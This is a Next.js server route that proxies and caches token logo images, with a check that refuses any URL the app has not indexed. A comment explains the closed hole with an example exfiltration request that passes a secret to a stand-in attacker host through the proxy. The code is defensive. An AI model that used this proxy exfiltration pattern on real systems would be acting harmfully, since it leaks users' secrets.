import { NextResponse } from "next/server";
import { cached, noteImage, recentlyFailed, resolveImage } from "@/lib/feed/images";
import { isKnownLogo } from "@/lib/feed/query";

export const runtime = "nodejs";
export const dynamic = "force-dynamic";

/**
 * Serves token artwork from the shared cache, fetching it if the launch sweep
 * has not warmed it yet. Resolution, gateway fallback and the private-address
 * guard all live in lib/feed/images.
 */
export async function GET(req: Request) {
  const raw = new URL(req.url).searchParams.get("u") ?? "";
  if (!raw || raw.length > 512) return new NextResponse(null, { status: 400 });

  /*
   * Only artwork this app has actually indexed.
   *
   * Without this the route is an open forward proxy: it fetched whatever URL
   * it was handed. That is an exfiltration channel that a Content-Security-
   * Policy cannot close, because the request to reach it is same-origin and
   * therefore allowed — a script on the page could call
   * /api/img?u=https://attacker/?k=<secret> and this server would dutifully
   * make that request on its behalf, carrying the secret in the URL.
   *
   * The logo strings come from token contracts and are already stored, so the
   * set of URLs worth proxying is known and finite. Anything else is refused.
   */
  if (!isKnownLogo(raw)) return new NextResponse(null, { status: 403 });

  /*
   * How long this request will wait for a logo that is not cached yet.
   *
   * Fetches are queued six at a time, so a viewer arriving during a burst
   * could otherwise sit behind a long line holding one of the browser's six
   * connections — which is the problem the queue was meant to solve, moved.
   * Waiting briefly and then giving up costs nothing: the fetch is already
   * running and keeps going, so the image is there on the next render.
   */
  const PATIENCE_MS = 2_500;
  /*
   * A distinct answer for "ran out of patience", because null is not one.
   *
   * resolveImage also resolves null when every gateway has definitively
   * refused, and that case is already booked as hardFail or softFail. Counting
   * it as gaveUpWaiting too made permanent 404s look like a slot shortage —
   * corrupting the exact reading these counters were added to give.
   *
   * The timer is cleared either way; a race leaves the loser running.
   */
  const TIMED_OUT = Symbol("timed out");
  const wait = <T,>(p: Promise<T>): Promise<T | typeof TIMED_OUT> => {
    let t: ReturnType<typeof setTimeout>;
    const patience = new Promise<typeof TIMED_OUT>((r) => {
      t = setTimeout(() => r(TIMED_OUT), PATIENCE_MS);
    });
    return Promise.race([p, patience]).finally(() => clearTimeout(t));
  };

  // A logo that failed everywhere a moment ago is not worth another attempt.
  noteImage("asked");
  let hit = cached(raw);
  // Counted here as well as in resolveImage: the route checks the cache first,
  // so without this the hit counter read zero while most requests were hits.
  if (hit) noteImage("cacheHit");
  if (!hit) {
    if (recentlyFailed(raw)) {
      noteImage("blocked");
    } else {
      const got = await wait(resolveImage(raw));
      if (got === TIMED_OUT) noteImage("gaveUpWaiting");
      else hit = got;
    }
  }
  /*
   * 404 rather than a placeholder: the client falls back to the direct URL and
   * then to its initials tile, which it can do only if this says nothing.
   *
   * Cached briefly. Uncached, it is re-requested on every render by every
   * viewer; cached for long, a logo that was merely slow this minute stays
   * missing for the rest of the session. Thirty seconds stops the stampede
   * without turning a busy gateway into a permanent hole in the feed.
   */
  if (!hit) {
    return new NextResponse(null, {
      status: 404,
      headers: { "cache-control": "public, max-age=30" },
    });
  }

  return new NextResponse(hit.body, {
    headers: { "content-type": hit.type, "cache-control": "public, max-age=1800" },
  });
}
